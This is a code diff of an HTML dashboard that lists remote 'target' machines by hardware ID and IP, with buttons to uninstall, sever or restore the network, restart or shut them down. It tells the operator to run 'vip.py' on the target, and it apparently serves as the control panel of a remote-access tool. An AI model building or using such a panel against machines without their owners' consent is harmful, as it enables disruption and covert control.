@@ -143,54 +143,13 @@
             <div class="global-metrics">
                 <div class="metric-box">
                     <div class="label">Total Nodes</div>
-                    <div class="value" id="active-count">1</div>
+                    <div class="value" id="active-count">0</div>
                 </div>
             </div>
         </header>
 
         <div class="targets-grid" id="targets-container">
-            <div class="target-card" data-identifier="client_alpha a98f-3321-b789 192.168.1.105">
-                <div class="card-header">
-                    <div class="target-identity">
-                        <div class="name">Client_Alpha</div>
-                        <div class="hwid">HWID: A98F-3321-B789</div>
-                    </div>
-                    <div class="status-badge status-online">
-                        <div class="status-dot"></div> ONLINE
-                    </div>
-                </div>
-
-                <div class="telemetry-box">
-                    <div class="telemetry-row">IP Address: <span>192.168.1.105</span></div>
-                    <div class="telemetry-row">Status Scope: <span>Monitored Live</span></div>
-                </div>
-
-                <div class="action-group">
-                    <div class="group-title">Maintenance & Cleanup</div>
-                    <div class="btn-grid">
-                        <button class="cmd-btn btn-warning" onclick="sendAction('A98F-3321-B789', 'uninstall')">⚡ Uninstaller</button>
-                        <button class="cmd-btn btn-warning" onclick="sendAction('A98F-3321-B789', 'clean')">🧹 Deep Clean</button>
-                    </div>
-                </div>
-
-                <div class="action-group">
-                    <div class="group-title">Network Subsystem</div>
-                    <div class="btn-grid">
-                        <button class="cmd-btn btn-accent" onclick="sendAction('A98F-3321-B789', 'netcrash')">🌐 Sever Net</button>
-                        <button class="cmd-btn" onclick="sendAction('A98F-3321-B789', 'netrestore')">🔌 Restore Net</button>
-                    </div>
-                </div>
-
-                <div class="action-group">
-                    <div class="group-title">System Power Control</div>
-                    <div class="btn-grid">
-                        <button class="cmd-btn btn-danger" onclick="sendAction('A98F-3321-B789', 'restart')">🔄 Restart</button>
-                        <button class="cmd-btn btn-danger" onclick="sendAction('A98F-3321-B789', 'shutdown')">🛑 Shutdown</button>
-                    </div>
-                </div>
-
-                <div class="console-output" id="log-A98F-3321-B789">> System ready. Live telemetry active...</div>
-            </div>
+            <!-- Dynamic clients will load here -->
         </div>
     </div>
 
@@ -204,64 +163,63 @@
                     const keys = Object.keys(data);
                     
                     activeCount.innerText = keys.length;
+                    container.innerHTML = '';
 
-                    if (keys.length === 0) return;
+                    if (keys.length === 0) {
+                        container.innerHTML = '<div style="color: var(--text-muted); padding: 20px;">No active clients connected. Run vip.py on target machine.</div>';
+                        return;
+                    }
 
                     keys.forEach(hwid => {
                         const client = data[hwid];
-                        const ip = client.ip || '192.168.1.105';
+                        const ip = client.ip || 'Unknown';
                         const status = client.status || 'ONLINE';
                         
-                        let card = document.querySelector(`[data-identifier*="${hwid.toLowerCase()}"]`);
-                        
-                        if (!card) {
-                            // Kung may bagong client na pumasok at wala pa sa static HTML, gagawa ito ng kaparehong card design mo
-                            const cardHtml = `
-                                <div class="target-card" data-identifier="client_alpha ${hwid.toLowerCase()} ${ip.toLowerCase()}">
-                                    <div class="card-header">
-                                        <div class="target-identity">
-                                            <div class="name">Client_Alpha</div>
-                                            <div class="hwid">HWID: ${hwid}</div>
-                                        </div>
-                                        <div class="status-badge ${status === 'ONLINE' ? 'status-online' : 'status-offline'}">
-                                            <div class="status-dot"></div> ${status}
-                                        </div>
+                        const cardHtml = `
+                            <div class="target-card" data-identifier="client_alpha ${hwid.toLowerCase()} ${ip.toLowerCase()}">
+                                <div class="card-header">
+                                    <div class="target-identity">
+                                        <div class="name">Client_Alpha</div>
+                                        <div class="hwid">HWID: ${hwid}</div>
                                     </div>
-
-                                    <div class="telemetry-box">
-                                        <div class="telemetry-row">IP Address: <span>${ip}</span></div>
-                                        <div class="telemetry-row">Status Scope: <span>Monitored Live</span></div>
+                                    <div class="status-badge ${status === 'ONLINE' ? 'status-online' : 'status-offline'}">
+                                        <div class="status-dot"></div> ${status}
                                     </div>
-
-                                    <div class="action-group">
-                                        <div class="group-title">Maintenance & Cleanup</div>
-                                        <div class="btn-grid">
-                                            <button class="cmd-btn btn-warning" onclick="sendAction('${hwid}', 'uninstall')">⚡ Uninstaller</button>
-                                            <button class="cmd-btn btn-warning" onclick="sendAction('${hwid}', 'clean')">🧹 Deep Clean</button>
-                                        </div>
-                                    </div>
-
-                                    <div class="action-group">
-                                        <div class="group-title">Network Subsystem</div>
-                                        <div class="btn-grid">
-                                            <button class="cmd-btn btn-accent" onclick="sendAction('${hwid}', 'netcrash')">🌐 Sever Net</button>
-                                            <button class="cmd-btn" onclick="sendAction('${hwid}', 'netrestore')">🔌 Restore Net</button>
-                                        </div>
-                                    </div>
-
-                                    <div class="action-group">
-                                        <div class="group-title">System Power Control</div>
-                                        <div class="btn-grid">
-                                            <button class="cmd-btn btn-danger" onclick="sendAction('${hwid}', 'restart')">🔄 Restart</button>
-                                            <button class="cmd-btn btn-danger" onclick="sendAction('${hwid}', 'shutdown')">🛑 Shutdown</button>
-                                        </div>
-                                    </div>
-
-                                    <div class="console-output" id="log-${hwid}">> System ready. Live telemetry active...</div>
                                 </div>
-                            `;
-                            container.insertAdjacentHTML('beforeend', cardHtml);
-                        }
+
+                                <div class="telemetry-box">
+                                    <div class="telemetry-row">IP Address: <span>${ip}</span></div>
+                                    <div class="telemetry-row">Status Scope: <span>Monitored Live</span></div>
+                                </div>
+
+                                <div class="action-group">
+                                    <div class="group-title">Maintenance & Cleanup</div>
+                                    <div class="btn-grid">
+                                        <button class="cmd-btn btn-warning" onclick="sendAction('${hwid}', 'uninstall')">⚡ Uninstaller</button>
+                                        <button class="cmd-btn btn-warning" onclick="sendAction('${hwid}', 'clean')">🧹 Deep Clean</button>
+                                    </div>
+                                </div>
+
+                                <div class="action-group">
+                                    <div class="group-title">Network Subsystem</div>
+                                    <div class="btn-grid">
+                                        <button class="cmd-btn btn-accent" onclick="sendAction('${hwid}', 'netcrash')">🌐 Sever Net</button>
+                                        <button class="cmd-btn" onclick="sendAction('${hwid}', 'netrestore')">🔌 Restore Net</button>
+                                    </div>
+                                </div>
+
+                                <div class="action-group">
+                                    <div class="group-title">System Power Control</div>
+                                    <div class="btn-grid">
+                                        <button class="cmd-btn btn-danger" onclick="sendAction('${hwid}', 'restart')">🔄 Restart</button>
+                                        <button class="cmd-btn btn-danger" onclick="sendAction('${hwid}', 'shutdown')">🛑 Shutdown</button>
+                                    </div>
+                                </div>
+
+                                <div class="console-output" id="log-${hwid}">> System ready. Live telemetry active...</div>
+                            </div>
+                        `;
+                        container.insertAdjacentHTML('beforeend', cardHtml);
                     });
                 })
                 .catch(err => console.error('Error fetching clients:', err));
@@ -305,10 +263,11 @@
                 }
             })
             .catch(err => {
-                consoleBox.innerText = `> Error: 404 Not Found or Network Error`;
+                consoleBox.innerText = `> Error: Network Error`;
             });
         }
 
+        fetchClients();
         setInterval(fetchClients, 3000);
     </script>
 </body>
